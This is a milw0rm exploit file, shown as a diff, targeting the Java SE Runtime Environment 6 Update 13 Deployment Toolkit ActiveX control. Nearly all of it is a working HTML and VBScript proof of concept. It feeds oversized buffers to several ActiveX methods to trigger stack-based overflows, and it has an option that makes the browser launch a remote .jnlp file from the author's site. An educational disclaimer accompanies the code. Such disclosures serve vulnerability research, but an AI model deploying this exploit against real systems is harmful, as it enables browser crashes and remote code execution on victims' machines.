@@ -1,0 +1,86 @@
+-------------------------------------------------------------------------
+ Java SE Runtime Environment - JRE 6 Update 13 Multiple Vulnerabilities
+ url: http://java.sun.com/
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://www.shinnai.net/
+
+ File: deploytk.dll
+ Ver.: 6.0.130.3
+ Des.: Deployment Toolkit
+ Url : http://javadl.sun.com/webapps/
+ Pac.: jre-6u13-windows-i586-p.exe
+
+ Mar.: RegKey Safe for Script: False
+       RegKey Safe for Init: False
+       Implements IObjectSafety: True
+       IDisp Safe: Safe for untrusted: caller,data
+       IPersist Safe: Safe for untrusted: caller,data
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Tested on Windows XP Professional SP3 full patched, Internet Explorer 8
+
+ N.B.:
+ Detailed informations about the "launch (remote .jnlp execution)" will
+ be released on request.
+-------------------------------------------------------------------------
+<object classid='clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA' id='test' height = 0 width = 0></object>
+
+<select style="width: 404px" name="Pucca">
+  <option value = "setInstallerType">setInstallerType</option>
+  <option value = "setAdditionalPackages">setAdditionalPackages</option>
+  <option value = "installLatestJRE">installLatestJRE</option>
+  <option value = "compareVersion">compareVersion</option>
+  <option value = "installJRE">installJRE</option>
+  <option value = "getStaticCLSID">getStaticCLSID</option>
+  <option value = "launch">launch (remote .jnlp execution)</option>
+  <option value = "launch1">launch (stack-based BoF)</option>
+</select>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+ Sub tryMe
+  On Error Resume Next
+  
+  If Pucca.Value = "setInstallerType" Then
+   buff = String(1500000, "A")
+   test.setInstallerType buff
+  ElseIf Pucca.Value = "setAdditionalPackages" Then
+   buff = String(1500000, "A")
+   test.setAdditionalPackages buff
+  ElseIf Pucca.Value = "installLatestJRE" Then
+   test.installLatestJRE
+  ElseIf Pucca.Value = "compareVersion" Then
+   buff = String(1500000, "A")
+   test.compareVersion buff, buff
+  ElseIf Pucca.Value = "installJRE" Then
+   test.installJRE ""
+  ElseIf Pucca.Value = "getStaticCLSID" Then
+   buff = String(1500000, "A")
+   test.getStaticCLSID buff
+  ElseIf Pucca.Value = "launch" Then
+   If(MsgBox(vbCrLf & "This exploit will launch the ForCicle.jnlp hosted on http://www.shinnai.net/" & _
+      vbCrLf & "The file is trusted and just run a infinite loop which will lead into a resource consuption.          " & _
+      vbCrLf & vbCrLf & "ARE YOU SURE YOU REALLY WANT TO RUN THE EXPLOIT?" & vbCrLf & vbCrLf, 1, "shinnai")=vbOk) Then
+    buff = "http://www.shinnai.net/jre/ForCicle.jnlp"
+    test.launch buff
+    test.launch buff
+    test.launch buff
+    test.launch buff
+    test.launch buff
+   Else
+   End if
+  ElseIf Pucca.Value = "launch1" Then
+   buff = String(1500000, "A")
+   test.launch buff
+  Else
+   MsgBox Err.Description, vbCritical, "shinnai"
+  End if
+ End Sub
+</script>
+
+# milw0rm.com [2009-05-13]
